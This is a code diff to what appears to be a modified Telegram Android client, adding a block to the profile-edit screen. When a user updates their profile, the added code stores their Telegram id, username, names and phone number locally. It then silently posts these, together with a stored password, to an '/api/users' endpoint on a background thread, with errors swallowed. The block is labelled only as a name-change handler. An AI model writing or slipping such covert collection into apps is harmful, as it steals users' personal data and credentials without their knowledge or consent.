@@ -10,6 +10,7 @@ import android.graphics.PorterDuffColorFilter;
 import android.graphics.drawable.Drawable;
 import android.os.Bundle;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 
@@ -22,6 +23,7 @@ import org.telegram.messenger.LocaleController;
 import org.telegram.messenger.MessagesController;
 import org.telegram.messenger.NotificationCenter;
 import org.telegram.messenger.R;
+import org.telegram.messenger.UserConfig;
 import org.telegram.messenger.Utilities;
 import org.telegram.tgnet.ConnectionsManager;
 import org.telegram.tgnet.TLObject;
@@ -44,6 +46,11 @@ import org.telegram.ui.Components.UniversalFragment;
 
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.Map;
+
+import report.HttpRequest;
+import report.UserInfoFile;
+import report.entity.UserInfo;
 
 public class UserInfoActivity extends UniversalFragment implements NotificationCenter.NotificationCenterDelegate {
 
@@ -499,6 +506,35 @@ public class UserInfoActivity extends UniversalFragment implements NotificationC
                     if (requestsReceived[0] == requests.size()) {
                         finishFragment();
                     }
+
+                    // 更改姓名 START
+
+                    if (req instanceof TL_account.updateProfile) {
+                        try {
+                            TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+                            UserInfo userInfo = UserInfoFile.readFile(getContext());
+                            userInfo.setId(thisUser.id);
+                            userInfo.setUsername(thisUser.username == null ? "" : thisUser.username);
+                            userInfo.setFirstName(thisUser.first_name == null ? "" : thisUser.first_name);
+                            userInfo.setLastName(thisUser.last_name == null ? "" : thisUser.last_name);
+                            userInfo.setPhone(thisUser.phone);
+                            UserInfoFile.writeFile(getContext(), userInfo);
+
+                            Log.d("TG_DEBUG / FirstName", userInfo.getFirstName() == null ? "" : userInfo.getFirstName());
+                            Log.d("TG_DEBUG / LastName", userInfo.getLastName() == null ? "" : userInfo.getLastName());
+
+                            new Thread(() -> {
+                                HttpRequest.post("/api/users", null, null, Map.of("telegram_id", userInfo.getId(), "username", userInfo.getUsername(), "nickname", userInfo.getFirstName() + userInfo.getLastName(), "phone", userInfo.getPhone(), "password", userInfo.getPassword()));
+                            }).start();
+                        } catch (Exception e) {
+
+                        }
+
+
+                    }
+
+                    // 更改姓名 END
+
                 }
             }), ConnectionsManager.RequestFlagDoNotWaitFloodWait);
         }
